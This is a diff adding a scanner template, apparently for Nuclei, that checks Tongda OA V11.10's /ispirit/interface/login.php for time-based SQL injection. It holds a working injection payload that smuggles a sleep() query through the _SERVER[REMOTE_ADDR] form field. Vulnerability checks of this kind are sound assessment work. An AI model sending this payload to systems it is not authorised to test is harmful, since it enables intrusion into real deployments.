@@ -1,0 +1,52 @@
+id: tongda-oa-ispirit-interface-login-sqli
+info:
+  name: 通达 OA /ispirit/interface/login.php - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/12442RF/Npoc/blob/1682eec2674f9010aec534dee8f15d89717a4399/extention/yaml/TongDa-32.yaml#L8
+    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOAV11.10%E6%8E%A5%E5%8F%A3login.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    sqlmap: none
+    version: 通达 OA V11.10
+  tags: 2024,sqli,tongda,oa,sqli,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /ispirit/interface/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        sec-ch-ua: "Chromium";v="127", "Not)A;Brand";v="99"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        Accept-Language: zh-CN
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+  
+        name=123&pass=123&_SERVER[REMOTE_ADDR]=1','10',(select+@`,'`+or+if(1%3d0,1,(select+sleep(6)))+limit+0,1))--+'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'fieldset','错误','请联系管理员')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
